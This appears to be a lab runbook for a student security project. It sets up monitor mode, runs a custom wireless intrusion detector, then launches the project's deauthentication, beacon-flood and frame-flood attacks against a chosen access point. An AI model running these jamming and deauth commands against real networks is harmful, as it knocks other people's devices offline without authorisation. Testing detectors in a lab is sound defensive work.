## 1. Check adapter name
```bash
iwconfig
# look for wlx... interface
```

## 2. Enable monitor mode
```bash
sudo airmon-ng check kill
sudo airmon-ng start wlx503eaa92edc5   # replace with your wlx name
```

## 3. Scan for targets
```bash
sudo airodump-ng wlan0mon
# note BSSID and channel of target → Ctrl+C
```

## 4. Lock to target channel
```bash
sudo iwconfig wlan0mon channel 11   # replace 11 with target channel
```

## 5. Start WIDS — Terminal 2 (before attack)
```bash
cd ~/CNS-Secondary-project
sudo PYTHONPATH=src python3 src/detection/wids.py --iface wlan0mon --log results/wids_alerts.csv
```

## 6. Run attacks — Terminal 1
```bash
cd ~/CNS-Secondary-project

# deauth — kicks devices off AP (WPA2 only)
sudo python3 src/main.py --skip-monitor --mode deauth --bssid XX:XX:XX:XX:XX:XX --channel 11 --duration 60

# beacon flood — congests channel with fake networks
sudo python3 src/main.py --skip-monitor --mode beacon --channel 11 --duration 60

# frame flood — saturates airtime with garbage frames
sudo python3 src/main.py --skip-monitor --mode flood --channel 11 --duration 60
```

## 7. Check WIDS alerts (after Ctrl+C on Terminal 2)
```bash
cat results/wids_alerts.csv
```

## 8. Restore network
```bash
sudo airmon-ng stop wlan0mon
sudo systemctl restart NetworkManager
sudo systemctl restart wpa_supplicant
```